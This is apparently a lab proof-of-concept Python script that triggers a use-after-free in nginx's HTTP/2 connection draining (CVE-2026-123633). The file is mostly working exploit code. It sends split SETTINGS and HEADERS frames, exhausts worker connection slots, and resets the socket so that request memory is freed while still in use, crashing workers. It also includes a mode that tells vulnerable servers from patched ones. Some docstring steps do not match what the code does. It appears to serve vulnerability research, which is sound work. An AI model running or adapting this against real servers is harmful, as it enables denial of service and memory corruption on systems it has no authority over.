#!/usr/bin/env python3
"""CVE-2026-123633 trigger client (NGINX2Root sibling: HTTP/2
connection-draining use-after-free, nginx 1.19.7..1.31.8; fixed in
1.31.9).

Stdlib-only; imports the root /poc/h2lib.py (read-only mount) for the
minimal h2 client. Runs inside the lab's probe container.

MECHANISM (source-verified on 1.31.8 vs 1.31.9 — see lab/123633/README):

  1. A TLS+h2 connection receives an INCOMPLETE NON-HEADERS frame —
     the lab cuts a client SETTINGS frame mid-payload (6-byte payload
     declared, 3 bytes sent). ngx_http_v2_state_save() sets
     h2c->state.incomplete = 1, and at the end of the read dispatch
     ngx_http_v2_handle_connection() reaches ngx_reusable_connection(
     c, 1) — enqueuing the connection as reusable — and ONLY THEN
     checks h2c->state.incomplete and returns early, leaving the NORMAL
     read handler installed and the h2c pool alive. Trace-verified on
     the lab's 1.31.8: an incomplete HEADERS *payload* does NOT mark
     (that dispatch returns before the mark), but an incomplete
     SETTINGS does. Nothing ever de-queues the marked connection when
     a stream later opens: 1.31.8 calls ngx_reusable_connection(c, 0)
     only in ngx_http_v2_init() and the idle handler — never in
     create_stream (the entire 1.31.9 fix is adding that call).
  2. A busy-holder stream (GET /slow?ms=N on stream 1) keeps the h2
     connection OUT of the reusable queue (processing=1 blocks the
     mark) while idle HTTP/1 keepalive fillers consume
     worker_connections slots on the same worker. ngx_get_connection()
     calls ngx_drain_connections() on EVERY allocation, and the drain
     acts once free_connection_n <= worker_connections/16 — fill-phase
     drains take the LEAST-recently-marked FILLERS (victims are taken
     from the queue TAIL: ngx_reusable_connection(c,1) inserts at the
     HEAD, ngx_drain_connections() takes ngx_queue_last), so the busy
     h2 connection is untouchable during the fills.
  3. When /slow completes: stream 1 closes and that dispatch ends with
     processing=0 AND the still-incomplete SETTINGS in h2c->state —
     ngx_http_v2_handle_connection() now MARKS the connection
     reusable (newest mark) and returns early: normal read handler
     installed, h2c pool alive. A short top-up round of fresh fillers
     repairs slot pressure (the h2 mark is still newest — safe), then
     one /health re-request on every live filler re-marks them all at
     the head — leaving the h2 mark as the queue TAIL (oldest), i.e.
     exactly what ngx_drain_connections() selects first.
  4. The completion write (SETTINGS rest + a COMPLETE HEADERS frame on
     stream 3, plus a second one on stream 5): the SETTINGS completes
     without mark churn, the HEADERS opens the stream with the
     connection STILL marked (1.31.8 never un-marks in create_stream —
     the entire 1.31.9 fix is ngx_reusable_connection(h2c->connection,
     0) there), and the request runs proxy_pass ->
     ngx_event_connect_peer() -> ngx_get_connection(); the drain fires
     synchronously, selects the h2 connection, sets c->close = 1 and
     calls c->read->handler() — the normal h2 read handler, whose
     c->close block (h2c->processing > 0) sends GOAWAY mid-request
     (drain #1, stream 3) and skips the send on the next drain
     (h2c->goaway already set, stream 5).
  4. If the client already RST'd its TCP, that GOAWAY write fails ->
     ngx_http_v2_finalize_connection() -> per-stream
     ngx_http_v2_close_stream() -> ngx_http_free_request() +
     ngx_destroy_pool() — the request pool (including the upstream u /
     u->peer that ngx_event_connect_peer is still using) is FREED while
     the caller is still on the stack. Back in ngx_event_connect_peer,
     pc->connection = c writes through the freed pool: the UAF.

MODES:
  sanity  one clean h2 GET through proxy_pass (stack check; exit 1 on
          failure)
  oracle  the differential oracle WITHOUT any crash: same interleaving
          but NO RST. Vulnerable 1.31.8: the drain hits the
          reusable-marked h2 connection mid-request and the client
          observes GOAWAY (NO_ERROR) arriving BEFORE the response data.
          Fixed 1.31.9: the connection is un-marked when the stream
          opens, the drain only closes h1 keepalives, no GOAWAY before
          the response.
  race    the crash attempt: kill the trigger connection (--close-mode
          rst = SO_LINGER 0, or fin = plain close) --rst-gap ms after
          the completion write, then a bounded /health probe for
          worker-liveness. The authoritative evidence is server-side
          (docker compose logs): ASAN report / "worker process exited
          on signal" / ALERT "http request count is zero".

BLOCKING DISCIPLINE: every socket has settimeout(), each attempt runs
under a SIGALRM watchdog, --repeat is capped. Nothing here can hang the
shell that launched it. Always run under an outer timeout anyway.

Usage (inside the probe container):

    python /poc/123633/trigger.py --mode sanity  --target vuln:9443
    python /poc/123633/trigger.py --mode oracle  --target vuln:9443 --repeat 5
    python /poc/123633/trigger.py --mode race    --target vuln-asan:9443 \
        --path /refused --rst-gap 1 --repeat 10
"""

from __future__ import annotations

import argparse
import os
import re
import select
import signal
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import h2lib  # noqa: E402  (root /poc/h2lib.py, read-only)
from h2lib import (  # noqa: E402
    DATA, GOAWAY, HEADERS, build_frame, get_headers_block, hpack_literal,
)

MODES = ("sanity", "oracle", "race")
PATHS = ("/proxied", "/refused", "/slow")
MAX_REPEAT = 500
SID = 1  # sanity / slow-holder stream id (client side, odd)
TRIG_SID = 3  # trigger request stream id (odd, > SID)
SETTINGS = 0x4  # client SETTINGS frame type
EH_ES = 0x1 | 0x4  # END_STREAM | END_HEADERS


class Watchdog(Exception):
    """Raised (via SIGALRM) when one attempt exceeds the time budget."""


def _alarm(signum, frame):
    raise Watchdog("attempt exceeded watchdog budget")


def hard_rst(client: h2lib.H2Client, mode: str = "rst") -> None:
    """Kill the TLS+h2 connection: TCP RST (SO_LINGER 0) or clean FIN.

    rst: the classic shape — but note Linux DISCARDS unsent/unACKed
    outgoing data on a linger-0 close, so a rst_gap of 0 can destroy
    the completion bytes before the server reads them.
    fin: a plain close — pending data is delivered first, the FIN/EOF
    lands right behind it, and the server's next SSL_read returns 0
    (n == 0 with processing > 0 -> c->error -> finalize). The EOF is
    what the drain-invoked read handler needs to observe inside
    ngx_event_connect_peer's stack.
    """
    if mode == "fin":
        client.close()
        return
    try:
        client.raw.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                              struct.pack("ii", 1, 0))
    except OSError:
        pass
    client.close()


def trigger_flight(path: str, authority: str, extra_headers: int,
                   slow_ms: int):
    """(partial, completion) writes for one trigger attempt.

    partial     ONE write, three jobs at once: a COMPLETE HEADERS frame
                opening stream 1 = GET /slow?ms=N (the busy holder:
                processing=1 keeps the connection out of the reusable
                queue through the whole fill phase), followed by an
                INCOMPLETE client SETTINGS frame (6-byte payload
                declared, only 3 bytes sent) whose bytes are saved with
                state.incomplete=1 in the same read dispatch.
    completion  the SETTINGS payload rest + TWO COMPLETE HEADERS frames
                in ONE write (streams 3 and 5). Stream 3's upstream
                ngx_get_connection fires drain #1: the h2 connection's
                read handler (c->close block, processing > 0) SENDS
                GOAWAY and leaves the connection alive with
                h2c->goaway = 1 (and holds the upstream slot while the
                refusal is pending). Stream 5 then opens on the same
                still-marked connection and its upstream
                ngx_get_connection fires drain #2: this time the
                c->close block SKIPS the GOAWAY send (goaway already
                set) and falls through to the recv loop — where an
                RST that landed during the parse is immediately
                observed (ECONNRESET -> c->error ->
                ngx_http_v2_finalize_connection -> both streams'
                request pools freed UNDER ngx_event_connect_peer's
                stack: the use-after-free). With the free list still
                empty, the drain's tail-hack ("reusing connection
                again") even re-invokes the handler for another
                recv attempt.

    extra_headers pads the HEADERS block with literal fields: more
    parse work between stream-open and the upstream connect widens
    the scheduling window.
    """
    block = get_headers_block(path, authority, "https")
    for i in range(extra_headers):
        block += hpack_literal(f"x-pad-{i}", "p" * 24)
    frame3 = build_frame(HEADERS, EH_ES, TRIG_SID, block)
    frame5 = build_frame(HEADERS, EH_ES, TRIG_SID + 2, block)
    holder = get_headers_block(f"/slow?ms={slow_ms}", authority, "https")
    holder_frame = build_frame(HEADERS, EH_ES, SID, holder)
    settings = build_frame(SETTINGS, 0x0, 0, b"\x00\x01\x00\x00\x10\x00")
    return (holder_frame + settings[:12],
            settings[12:] + frame3 + frame5)


def h1_keepalive(host: str, port: int, timeout: float) -> socket.socket:
    """One idle HTTP/1 keepalive connection: GET /health, read the full
    response, leave it open (the server marks it reusable at the HEAD of
    the queue as it goes idle, holding a slot)."""
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)  # every later op on s is bounded
    s.sendall(b"GET /health HTTP/1.1\r\nHost: lab\r\n"
              b"Connection: keep-alive\r\n\r\n")
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = s.recv(1024)
        if not chunk:
            raise OSError("eof while reading /health headers")
        buf += chunk
    head, rest = buf.split(b"\r\n\r\n", 1)
    m = re.search(rb"Content-Length: (\d+)", head, re.I)
    clen = int(m.group(1)) if m else 0
    while len(rest) < clen:
        chunk = s.recv(1024)
        if not chunk:
            break
        rest += chunk
    return s


def probe_health(host: str, port: int, timeout: float) -> str:
    """Client-side worker-liveness check: GET /health, bounded."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(b"GET /health HTTP/1.1\r\nHost: localhost\r\n"
                  b"Connection: close\r\n\r\n")
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(512)
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return "<EOF: accepted but no worker answer (worker dead?)>"
        return data.split(b"\r\n", 1)[0].decode("latin1", "replace")
    except (socket.timeout, TimeoutError):
        return "<timeout: accepted but no worker answer (worker dead?)>"
    except OSError as e:
        return f"<oserror: {e}>"


def stub_active(host: str, port: int, timeout: float) -> int:
    """Active-connection count from /stub_status (bounded, 1 conn)."""
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(b"GET /stub_status HTTP/1.1\r\nHost: lab\r\n"
                  b"Connection: close\r\n\r\n")
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(512)
            if not chunk:
                break
            data += chunk
        m = re.search(rb"Active connections: (\d+)", data)
        return int(m.group(1)) if m else -1
    finally:
        s.close()


def h1_slow(host: str, port: int, ms: int, timeout: float) -> socket.socket:
    """One BUSY h1 connection: GET /slow?ms=N, response not read yet.

    Holds two worker slots (client conn + upstream conn) while the
    request is in flight and is never reusable-marked, so it is immune
    to connection draining — the pressure instrument.
    """
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(f"GET /slow?ms={ms} HTTP/1.1\r\nHost: lab\r\n\r\n".encode())
    return s  # response intentionally unread: stays busy


def sanity(host: str, port: int, path: str, timeout: float) -> bool:
    """One clean h2 GET through proxy_pass; True iff response DATA lands."""
    c = h2lib.H2Client(host, port, tls=True, timeout=timeout, rcvbuf=None)
    try:
        c.handshake()
        block = get_headers_block(path, "lab", "https")
        c.send_frame(HEADERS, h2lib.FLAG_END_HEADERS | h2lib.FLAG_END_STREAM,
                     SID, block)
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            c.fill(0.3)
            frames = c.parse_buffered()
            for f in frames:
                if f["type"] == DATA and f["sid"] == SID and f["len"] > 0:
                    return True
            if c.eof or c.reset:
                break
        return False
    finally:
        c.close()


def attempt(host: str, h2port: int, h1host: str, h1port: int, args,
            seq: int) -> None:
    """One oracle/race attempt on a fresh TLS+h2 connection.

    Queue law (source-verified 1.31.8): ngx_reusable_connection(c, 1)
    inserts at the queue HEAD (newest first) and ngx_drain_connections()
    takes ngx_queue_last (the LEAST-recently-marked) — plus a re-drain
    of the last victim if the free list is still empty. So the trigger
    needs the h2 connection's incomplete-mark to be the OLDEST mark at
    the moment of the request's upstream ngx_get_connection, while the
    connection must NOT be in the queue during the fill phase (any
    fill-phase drain would take it first and GOAWAY it with no stream
    open). Hence the busy-holder interleave:
      a. open stream 1 = GET /slow?ms=S (holds the conn busy:
         processing=1 blocks the reusable mark) AND queue an incomplete
         SETTINGS frame (state.incomplete=1 saved behind the stream);
      b. fill with h1 keepalives (drains during the fill kill the
         oldest FILLERS only — the h2 conn is un-marked/busy);
      c. when /slow completes: stream 1 closes, the read/write dispatch
         ends with processing=0 AND incomplete=1 -> handle_connection
         MARKS the h2 connection and returns early (normal read
         handler, h2c pool alive) — at this instant it is the NEWEST
         mark, so top-up fills here still only drain old fillers;
      d. re-request /health on every live filler: each re-mark moves
         that filler to the head, so after this round the h2 mark is
         the OLDEST (queue tail) — the drain's first victim;
      e. completion write (settings rest + full HEADERS on stream 3):
         the stream opens with the stale mark still on the connection
         (1.31.8 never un-marks in create_stream), the request runs
         proxy_pass -> ngx_event_connect_peer -> ngx_get_connection,
         which drains on every allocation when free_connection_n <=
         worker_connections/16 — the drain selects the h2 connection,
         sets c->close=1 and invokes its read handler mid-request:
         with a live socket that GOAWAY is observable by the client
         (oracle); with an RST-dead socket the GOAWAY write fails and
         ngx_http_v2_finalize_connection frees the request pool under
         the caller's stack — the use-after-free (race).
    """
    t0 = time.monotonic()
    partial, completion = trigger_flight(args.path, "lab", args.headers,
                                         args.slow_ms)

    # a. handshake, then ONE write: slow-holder HEADERS (stream 1) +
    #    the incomplete SETTINGS (state.incomplete=1 saved behind the
    #    stream, processing=1 keeps the connection out of the queue).
    #    150 ms settle so the holder parse is done before any filler
    #    accept can pressure the worker. (Never send more frames on
    #    this connection: the incomplete SETTINGS would swallow their
    #    leading bytes as its own payload.)
    c = h2lib.H2Client(host, h2port, tls=True, timeout=args.conn_timeout,
                       rcvbuf=None)
    c.handshake()
    c.send(partial)
    time.sleep(0.15)

    # b. pressure with BUSY h1 connections (GET /slow, response not
    #    read): each holds TWO worker slots (client + upstream) and is
    #    never reusable-marked, so connection drains cannot touch them
    #    and there is no idle-filler churn (an idle filler accept at
    #    free <= n/16 sacrifices ~3 OLD fillers — self-defeating
    #    pressure). Opened BEFORE the holder completes, while the h2
    #    connection is still busy/un-marked, so their own upstream
    #    ngx_get_connection drains (there are no reusable conns yet)
    #    are harmless. An open whose upstream failed (502 arrives fast)
    #    is detected by readability and replaced — a 502'd keepalive
    #    would idle-mark BEFORE the h2 mark and steal the victim slot.
    busy = []
    tries = 0
    while len(busy) < args.pressure_hold and tries < 24:
        tries += 1
        try:
            s = h1_slow(h1host, h1port, args.slow_ms * 4,
                        args.conn_timeout)
        except OSError:
            continue
        r, _, _ = select.select([s], [], [], 0.05)
        if r:  # early response = failed open (e.g. 502): not a holder
            s.close()
            continue
        busy.append(s)

    # c. wait for the /slow holder's response DATA on stream 1: its
    #    arrival means stream 1 closed server-side, i.e. that dispatch
    #    just ended with processing=0 + incomplete=1 -> the connection
    #    is reusable-marked NOW — with only busy (un-marked)
    #    connections around, the h2 mark is the ONLY reusable mark:
    #    the queue tail, the drain's first victim.
    holder_done = False
    deadline = time.monotonic() + args.slow_ms / 1000.0 + 3.0
    while time.monotonic() < deadline:
        c.fill(0.2)
        for f in c.parse_buffered():
            if f["type"] == DATA and f["sid"] == SID:
                holder_done = True
            elif f["type"] == GOAWAY:
                break
        if holder_done or c.eof or c.reset:
            break
    if not holder_done:
        print(f"[{seq}] abort: holder stream never completed "
              f"(data={holder_done})")
        c.close()
        for s in busy:
            try:
                s.close()
            except OSError:
                pass
        return
    time.sleep(0.1)

    # d. completion write: settings rest + full HEADERS (stream 3) ->
    #    stream opens still-marked -> proxy -> ngx_event_connect_peer
    #    -> ngx_get_connection -> free <= n/16 -> drain -> the h2
    #    connection (only reusable mark) runs its read handler with
    #    c->close=1 mid-request: GOAWAY (oracle) or, on an RST-dead
    #    socket, ngx_http_v2_finalize_connection frees the request
    #    pool under the caller's stack (the use-after-free).
    c.send(completion)

    if args.mode == "race":
        if args.rst_gap > 0:
            time.sleep(args.rst_gap / 1000.0)
        hard_rst(c, args.close_mode)
        for s in busy:
            try:
                s.close()
            except OSError:
                pass
        time.sleep(args.settle)
        health = probe_health(h1host, h1port, 2.0)
        gone = "DEAD?" if not health.startswith("HTTP/") else "alive"
        print(f"[{seq}] race: path={args.path} hold={len(busy)} "
              f"rst_gap={args.rst_gap}ms pad={args.headers} "
              f"t={time.monotonic() - t0:.2f}s health={health} "
              f"worker={gone}")
        return

    # oracle: no RST — read what comes back and classify by ORDER:
    # GOAWAY before the first response DATA on the trigger stream means
    # the drain selected this connection while the stream was active.
    goaway_before_data = None
    got_data = False
    got_goaway = None
    deadline = time.monotonic() + args.read_wait
    try:
        while time.monotonic() < deadline:
            c.fill(0.25)
            for f in c.parse_buffered():
                if f["type"] == DATA and f["sid"] == TRIG_SID \
                        and f["len"] > 0:
                    got_data = True
                    if goaway_before_data is None:
                        goaway_before_data = False
                elif f["type"] == GOAWAY:
                    got_goaway = f
                    if not got_data and goaway_before_data is None:
                        goaway_before_data = True
            if got_data and got_goaway:
                break
            if c.eof or c.reset:
                break
    finally:
        c.close()
        for s in busy:
            try:
                s.close()
            except OSError:
                pass

    if goaway_before_data is True:
        verdict = "VULNERABLE-STATE (drain GOAWAY'd the active h2 conn)"
    elif goaway_before_data is False and got_data:
        verdict = "PATCHED-STATE (no GOAWAY before response data)"
    else:
        verdict = f"UNCLEAR (data={got_data} goaway={bool(got_goaway)} " \
                  f"eof={c.eof} rst={c.reset})"
    print(f"[{seq}] oracle: path={args.path} hold={len(busy)} "
          f"pad={args.headers} t={time.monotonic() - t0:.2f}s -> {verdict}")


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="vuln:9443",
                    help="host:port of an nginx h2 listener (default vuln:9443)")
    ap.add_argument("--h1-target", default=None,
                    help="host:port of the same nginx's h1 listener "
                         "(default: target host, port 8080)")
    ap.add_argument("--mode", default="race", choices=MODES)
    ap.add_argument("--path", default="/refused", choices=PATHS,
                    help="trigger request path (default /refused)")
    ap.add_argument("--repeat", type=int, default=1,
                    help=f"attempts, each on a fresh connection "
                         f"(capped at {MAX_REPEAT})")
    ap.add_argument("--split-pause", type=float, default=0.3,
                    help="(unused knob kept for matrix compatibility; "
                         "the mark timing is driven by --slow-ms)")
    ap.add_argument("--pressure-hold", type=int, default=14,
                    help="BUSY h1 /slow requests held across the trigger "
                         "(default 14: each holds 2 slots, so with WC=32, "
                         "2 listeners + 1 h2 + 14x2 = 31 -> free=1 and the "
                         "trigger request's upstream ngx_get_connection "
                         "drains; use (WC-5)/2 rounded up for other WC)")
    ap.add_argument("--slow-ms", type=int, default=1500,
                    help="upstream hold time for the busy-holder stream "
                         "(default 1500 ms — must comfortably outlast "
                         "the pressure-open phase)")
    ap.add_argument("--slow-margin", type=int, default=400,
                    help="extra ms waited after --slow-ms before the "
                         "mark/pressure/re-mark phase (default 400)")
    ap.add_argument("--fill-settle", type=float, default=0.2,
                    help="pause after the filler re-mark round, seconds "
                         "(default 0.2)")
    ap.add_argument("--rst-gap", type=float, default=0.5,
                    help="race mode: ms between the completion write and "
                         "the RST (default 0.5: the RST must land after "
                         "the data but before the drain's GOAWAY write)")
    ap.add_argument("--headers", type=int, default=0,
                    help="extra literal pad headers (widen the parse "
                         "window between frame-completion and the drain's "
                         "GOAWAY write; default 0)")
    ap.add_argument("--close-mode", default="rst", choices=("rst", "fin"),
                    help="how the trigger connection is killed after the "
                         "completion write: rst (SO_LINGER 0 — may discard "
                         "the unACKed completion bytes) or fin (plain close "
                         "— data delivered, EOF right behind; the EOF is "
                         "what the drain-invoked read handler observes)")
    ap.add_argument("--settle", type=float, default=1.2,
                    help="race mode: seconds before the health probe "
                         "(default 1.2)")
    ap.add_argument("--read-wait", type=float, default=2.0,
                    help="oracle mode: seconds to read the response "
                         "stream (default 2.0)")
    ap.add_argument("--conn-timeout", type=float, default=3.0,
                    help="per-socket-op timeout, seconds (default 3.0)")
    ap.add_argument("--watchdog", type=float, default=30.0,
                    help="SIGALRM budget per attempt, seconds (default 30)")
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    if not port.isdigit():
        print(f"bad target {args.target!r} (want host:port)", file=sys.stderr)
        return 2
    h1host, _, h1port = (args.h1_target or f"{host}:8080").partition(":")
    if not h1port.isdigit():
        print(f"bad --h1-target {args.h1_target!r}", file=sys.stderr)
        return 2
    if not 1 <= args.repeat <= MAX_REPEAT:
        print(f"--repeat must be 1..{MAX_REPEAT}", file=sys.stderr)
        return 2
    if args.pressure_hold < 0:
        print("--pressure-hold must be >= 0", file=sys.stderr)
        return 2

    if args.mode == "sanity":
        ok = sanity(host, int(port), args.path, args.conn_timeout)
        print(f"sanity: h2 GET {args.path} -> "
              f"{'SANITY-OK (response data received)' if ok else 'SANITY-FAIL'}")
        return 0 if ok else 1

    signal.signal(signal.SIGALRM, _alarm)
    for i in range(args.repeat):
        signal.setitimer(signal.ITIMER_REAL, args.watchdog)
        try:
            attempt(host, int(port), h1host, int(h1port), args, i)
        except Watchdog:
            print(f"[{i}] WATCHDOG TRIPPED after {args.watchdog}s")
        except OSError as e:
            print(f"[{i}] client error: {e}")
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        time.sleep(0.25)  # let logs settle before the next attempt

    print("done — server-side evidence of record: docker compose logs "
          "<svc> | grep -E 'AddressSanitizer|exited on signal|"
          "http request count is zero|reusing connections'")
    return 0


if __name__ == "__main__":
    sys.exit(main())
